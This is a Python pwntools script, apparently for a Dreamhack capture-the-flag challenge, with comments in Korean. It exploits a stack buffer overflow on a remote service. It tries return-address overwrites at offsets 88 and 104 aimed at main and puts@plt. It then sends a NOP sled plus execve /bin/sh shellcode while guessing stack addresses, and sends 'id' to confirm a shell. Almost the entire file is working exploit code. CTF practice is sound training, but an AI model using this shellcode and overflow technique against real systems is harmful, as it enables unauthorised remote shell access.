#!/usr/bin/env python3
"""
원격 서버 환경 분석을 위한 종합적인 접근
"""

from pwn import *

HOST = 'host8.dreamhack.games'
PORT = 13646

def test_different_approaches():
    """다양한 접근법으로 원격 환경 분석"""
    
    approaches = [
        {
            'name': 'Standard 64-bit offset (88)',
            'payload': lambda: b'A' * 88 + p64(0x400571)
        },
        {
            'name': 'Alternative offset (104)', 
            'payload': lambda: b'A' * 104 + p64(0x400571)
        },
        {
            'name': 'Different main address',
            'payload': lambda: b'A' * 88 + p64(0x400000)  # 다른 추정 주소
        },
        {
            'name': 'puts@plt call',
            'payload': lambda: b'A' * 88 + p64(0x400370)
        },
        {
            'name': 'Simple crash test',
            'payload': lambda: b'A' * 88 + p64(0x4141414141414141)
        }
    ]
    
    for approach in approaches:
        try:
            print(f"\n[+] Testing: {approach['name']}")
            r = remote(HOST, PORT)
            
            r.recvuntil(b"Your Input:", timeout=3)
            
            payload = approach['payload']()
            print(f"    Payload length: {len(payload)}")
            
            r.sendline(payload)
            
            # 응답 분석
            try:
                response = r.recv(timeout=3)
                print(f"    Response: {repr(response)}")
                
                # 특별한 응답 패턴 찾기
                if len(response) > 1:
                    print(f"    [!] Non-standard response detected!")
                if b'Your Input:' in response:
                    print(f"    [!] Possible ret2main success!")
                if b'DH{' in response:
                    print(f"    [!] FLAG FOUND: {response}")
                    
            except:
                print(f"    No response (possible crash)")
            
            r.close()
            
        except Exception as e:
            print(f"    Error: {e}")

def test_stack_addresses():
    """다양한 스택 주소로 쉘코드 테스트"""
    
    stack_addrs = [
        0x7fffffffe000,
        0x7fffffffdf00, 
        0x7fffffffdff0,
        0x7fffffffe010,
        0x7fffffffe020,
    ]
    
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    
    for addr in stack_addrs:
        try:
            print(f"\n[+] Testing stack address: 0x{addr:x}")
            r = remote(HOST, PORT)
            
            r.recvuntil(b"Your Input:", timeout=3)
            
            nop_sled = b"\x90" * 40
            payload = nop_sled + shellcode
            payload += b"A" * (88 - len(payload))
            payload += p64(addr)
            
            r.sendline(payload)
            
            # 쉘 테스트
            r.sendline(b"id")
            response = r.recv(timeout=2)
            
            if b"uid=" in response:
                print(f"    [!] SHELL OBTAINED with address 0x{addr:x}!")
                return True
            else:
                print(f"    No shell response: {repr(response)}")
            
            r.close()
            
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

if __name__ == "__main__":
    print("=== Comprehensive Remote Analysis ===")
    
    # 1. 다양한 접근 방법 테스트
    test_different_approaches()
    
    # 2. 쉘코드 + 스택 주소 테스트
    print("\n" + "="*50)
    print("Testing shellcode with different stack addresses...")
    if test_stack_addresses():
        print("[!] Shell exploitation successful!")
    else:
        print("[-] All shellcode attempts failed")
    
    print("\n[+] Analysis complete")
